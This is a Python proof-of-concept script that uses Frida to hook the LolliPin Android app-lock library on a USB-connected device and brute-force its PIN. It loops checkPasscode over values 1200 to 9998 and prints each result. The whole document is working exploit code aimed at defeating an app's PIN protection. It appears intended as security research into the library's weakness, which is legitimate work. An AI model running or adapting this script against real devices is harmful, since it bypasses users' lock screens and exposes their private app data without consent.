# LolliPin bruteforce proof of concept

import frida,sys
 
def print_result(message):
    print "[*] Testing PIN %s" %(message)
 
def on_message(message, data):
    print_result(message['payload'])
 
jscode = """

setTimeout(function(){
Dalvik.perform(function () {
    var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
    var LockManagerInstance = LockManager.getInstance();
    var AppLock = LockManagerInstance.getAppLock();
 
    for(var i=1200; i<9999; i++)
    {    
    var result = AppLock.checkPasscode(i+"");
        send(i + ": " + result);
    }
});

    },0);

"""

process = frida.get_usb_device().attach("com.github.orangegangsters.lollipin") 
script = process.create_script(jscode)
script.on('message', on_message)
 
print "[*] Bruteforcing PIN code"
 
script.load()
sys.stdin.read()

